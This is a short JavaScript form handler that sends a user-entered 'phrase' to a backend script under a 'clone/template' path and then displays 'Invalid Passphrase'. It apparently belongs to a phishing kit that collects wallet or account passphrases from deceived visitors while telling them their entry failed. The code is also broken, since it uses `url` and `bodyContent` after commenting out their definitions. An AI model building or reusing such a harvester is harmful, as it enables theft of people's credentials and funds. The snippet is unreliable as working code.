function handleSubmit(event) {
  event.preventDefault();
  const errorElement = document.getElementById("emsg");
  errorElement.textContent = "";
  const myButton = document.getElementById("b1");
  myButton.disabled = true;

  const myButton2 = document.getElementById("b2");
  myButton2.disabled = true;

  const form = document.getElementById("myForm");
  const inputValue = form.elements["mf-texts"].value.trim();

  // const url = `http://localhost/clone/template/include/form.php`;
  // let bodyContent = JSON.stringify({ phrase: inputValue });

  fetch(url, {
    method: "POST",
    body: bodyContent,
    headers: { "Content-Type": "application/json" },
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Network response was not ok");
      }
      return response.json();
    })
    .then((data) => {
      if (data.error) {
        errorElement.textContent = data.error;
      } else {
        // Handle success here if needed
      }
      myButton.disabled = false;
      myButton2.disabled = false;
      form.reset();
    })
    .catch((error) => {
      errorElement.textContent = "Invalid Passphrase";
      myButton.disabled = false;
      myButton2.disabled = false;
    });
}

const form = document.getElementById("myForm");
form.addEventListener("submit", handleSubmit);
